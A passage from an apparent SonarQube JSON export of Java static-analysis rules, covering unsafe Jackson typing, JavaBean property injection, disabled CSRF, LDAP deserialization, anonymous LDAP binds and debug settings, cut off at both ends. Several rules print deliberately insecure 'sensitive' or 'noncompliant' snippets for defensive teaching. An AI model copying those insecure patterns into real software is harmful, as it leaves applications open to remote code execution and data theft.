Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-4995\">CVE-2017-4995</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-19362\">CVE-2018-19362</a> </li>\n</ul>\n<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, \"deserialization gadgets\"\nmay allow an attacker to perform remote code execution.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or\n  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>\n  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class, interface or field levels and configured with <code>use =\n  JsonTypeInfo.Id.CLASS</code> or <code>use = Id.MINIMAL_CLASS</code>. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You configured the Jackson deserializer as mentioned above. </li>\n  <li> The serialized data might come from an untrusted source. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered \"deserialization gadgets\". </li>\n  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>\n  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =\n  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping(); // Sensitive\n</pre>\n<pre>\n@JsonTypeInfo(use = Id.CLASS) // Sensitive\nabstract class PhoneNumber {\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\">Deserialization of untrusted data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> <a href=\"https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062\">On Jackson CVEs: Donât\n  Panic</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-15095\">CVE-2017-1509</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-7525\">CVE-2017-7525</a> </li>\n  <li> Derived from FindSecBugs rule <a\n  href=\"https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION\">JACKSON_UNSAFE_DESERIALIZATION</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4544","summary":"Using unsafe Jackson deserialization configuration is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were\nproperly considered, etc.</p>\n<p>For readability purposes, to help a developer quickly spot the default behavior of a <code>switch</code> statement, it is recommended to put the\n<code>default</code> clause at the end of the <code>switch</code> statement.</p>\n<p>This rule raises an issue if the <code>default</code> clause is not the last one of the <code>switch</code>'s cases.</p>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  default: // Noncompliant: default clause should be the last one\n    error();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4524","summary":"\"default\" clauses should be last","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from\nthe input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been\nreached, the value -1 is returned.</p>\n<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed twoâs complement integer. It has a minimum value of -128 and a maximum\nvalue of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>\nprimitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Override\npublic int read() throws IOException {\n  if (pos == buffer.length()) {\n    return -1;\n  }\n  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4517","summary":"InputSteam.read() implementation should not return a signed byte","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the\nJavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute\nmalicious code.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> BeanUtils.populate(â¦â) or BeanUtilsBean.populate(â¦â) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> BeanUtils.setProperty(â¦â) or BeanUtilsBean.setProperty(â¦â) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> org.springframework.beans.BeanWrapper.setPropertyValue(â¦â) or org.springframework.beans.BeanWrapper.setPropertyValues(â¦â) from Spring is called\n  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the new property values might have been tampered with or provided by an untrusted source. </li>\n  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize all values used as JavaBean properties.</p>\n<p>Donât set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,\nfilter them with a whitelist.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCompany bean = new Company();\nHashMap map = new HashMap();\nEnumeration names = request.getParameterNames();\nwhile (names.hasMoreElements()) {\n    String name = (String) names.nextElement();\n    map.put(name, request.getParameterValues(name));\n}\nBeanUtils.populate(bean, map); // Sensitive: \"map\" is populated with data coming from user input, here \"request.getParameterNames()\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/915\">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object\n  Attributes</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION\">BEAN_PROPERTY_INJECTION</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4512","summary":"Setting JavaBean properties is security-sensitive","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the applicationâs path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily\nparseable and can expose sensitive information:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace(); // Sensitive\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>true</code> enables debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = true) // Sensitive\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(true)</a>\nfor Android enables debugging support:</p>\n<pre>\nimport android.webkit.WebView;\n\nWebView.setWebContentsDebuggingEnabled(true); // Sensitive\nWebView.getFactory().getStatics().setWebContentsDebuggingEnabled(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e);\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>false</code> disables debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = false)\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(false)</a>\nfor Android disables debugging support:</p>\n<pre>\nimport android.webkit.WebView;\n\nWebView.setWebContentsDebuggingEnabled(false);\nWebView.getFactory().getStatics().setWebContentsDebuggingEnabled(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4507","summary":"Delivering code in production with debug features activated is security-sensitive","tags":["cwe","error-handling","spring","debug","user-experience"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didnât intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using\">Spring Security</a> provides by default a\nprotection against CSRF attacks which can be disabled:</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.csrf().disable(); // Sensitive: csrf protection is entirely disabled\n   // or\n    http.csrf().ignoringAntMatchers(\"/route/\"); // Sensitive: csrf protection is disabled for specific routes\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-using\">Spring Security</a> CSRF protection is enabled\nby default, do not disable it:</p>\n<pre>\n@EnableWebSecurity\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    // http.csrf().disable(); // Compliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-community/attacks/csrf\">Cross-Site Request Forgery</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222603\">Application Security and\n  Development: V-222603</a> - The application must protect from Cross-Site Request Forgery (CSRF) vulnerabilities. </li>\n  <li> PortSwigger - <a href=\"https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens\">Web storage: the lesser evil for\n  session tokens</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4502","summary":"Disabling CSRF protections is security-sensitive","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Spring framework 4.3 introduced variants of the <code>@RequestMapping</code> annotation to better represent the semantics of the annotated methods.\nThe use of <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>\nshould be preferred to the use of the raw <code>@RequestMapping(method = RequestMethod.XYZ)</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@RequestMapping(path = \"/greeting\", method = RequestMethod.GET) // Noncompliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@GetMapping(path = \"/greeting\") // Compliant\npublic Greeting greeting(@RequestParam(value = \"name\", defaultValue = \"World\") String name) {\n...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4488","summary":"Composed \"@RequestMapping\" variants should be preferred","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>By contract, the <code>equals(Object)</code> method, from <code>java.lang.Object</code>, should accept a <code>null</code> argument. Among all the\nother cases, the <code>null</code> case is even explicitly detailed in the <code>Object.equals(...)</code> Javadoc, stating <em>\"For any non-null\nreference value x, x.equals(null) should return false.\"</em></p>\n<p>Assuming that the argument to <code>equals</code> is always non-null, and enforcing that assumption with an annotation is not only a fundamental\nviolation of the contract of <code>equals</code>, but it is also likely to cause problems in the future as the use of the class evolves over time.</p>\n<p>The rule raises an issue when the <code>equals</code> method is overridden and its parameter annotated with any kind of <code>@Nonnull</code>\nannotation.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic boolean equals(Object obj) {\n  if (obj == null) {\n    return false;\n  }\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-4454","summary":"\"equals\" method parameters should not be marked \"@Nonnull\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When using null-related annotations at global scope level, for instance using <code>javax.annotation.ParametersAreNonnullByDefault</code> (from\nJSR-305) at package level, it means that all the parameters to all the methods included in the package will, or should, be considered\nNon-<code>null</code>. It is equivalent to annotating every parameter in every method with non-null annotations (such as <code>@Nonnull</code>).</p>\n<p>The rule raises an issue every time a parameter could be <code>null</code> for a method invocation, where the method is annotated as forbidding\nnull parameters.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nclass A {\n\n  void foo() {\n    bar(getValue()); // Noncompliant - method 'bar' do not expect 'null' values as parameter\n  }\n\n  void bar(Object o) { // 'o' is by contract expected never to be null\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<h3>Compliant solution</h3>\n<p>Two solutions are possible:</p>\n<ul>\n  <li> The signature of the method is correct, and null check should be done prior to the call. </li>\n  <li> The signature of the method is not coherent and should be annotated to allow null values being passed as parameter </li>\n</ul>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n      Object o = getValue();\n      if (o != null) {\n        bar(o); // Compliant - 'o' can not be null\n      }\n  }\n\n  void bar(Object o) {\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n<p>or</p>\n<pre>\n@javax.annotation.ParametersAreNonnullByDefault\nabstract class A {\n\n  void foo() {\n    bar(getValue());\n  }\n\n  void bar(@javax.annotation.Nullable Object o) { // annotation was missing\n    // ...\n  }\n\n  @javax.annotation.CheckForNull\n  abstract Object getValue();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4449","summary":"Nullness of parameters should be guaranteed","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code execution.</p>\n<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application connects to an untrusted LDAP directory. </li>\n  <li> User-controlled objects can be stored in the LDAP directory. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable deserialization of LDAP objects.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            true, // Noncompliant; allows deserialization\n            deref));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDirContext ctx = new InitialDirContext();\n// ...\nctx.search(query, filter,\n        new SearchControls(scope, countLimit, timeLimit, attributes,\n            false, // Compliant\n            deref));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf\">BlackHat\n  presentation</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING\">LDAP_ENTRY_POISONING</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4434","summary":"Allowing deserialization of LDAP objects is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The\n<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>\n<ul>\n  <li> <em>Anonymous</em> Authentication </li>\n  <li> <em>Unauthenticated</em> Authentication </li>\n  <li> <em>Name/Password</em> Authentication </li>\n</ul>\n<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing\ncredentials.</p>\n<h2>Why is this an issue?</h2>\n<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do\nnot provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted\ndirectory.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact\nvaries depending on the permission obtained on the directory and the type of data it stores.</p>\n<h4>Authentication bypass</h4>\n<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data\nsuch as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the\naffected directory as an identity provider.</p>\n<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>\n<h4>Sensitive information leak</h4>\n<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces\nof information.</p>\n<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to\nperform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>\n<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements\nin some countries. For example, this kind of security event would go against the European GDPR law.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple\nauthentication mechanism.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=JNDITutorial\");\n\n// Use anonymous authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"none\"); // Noncompliant\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// Set up the environment for creating the initial context\nHashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();\nenv.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:389/o=Example\");\n\n// Use simple authentication\nenv.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenv.put(Context.SECURITY_PRINCIPAL, \"cn=local, ou=Unit, o=Example\");\nenv.put(Context.SECURITY_CREDENTIALS, getLDAPPassword());\n\n// Create the initial context\nDirContext ctx = new InitialDirContext(env);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://datatracker.ietf.org/doc/html/rfc4513#section-5\">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication\n  Methods and Security Mechanisms</a> - Bind operations </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4433","summary":"LDAP connections should be authenticated","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In todayâs cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In 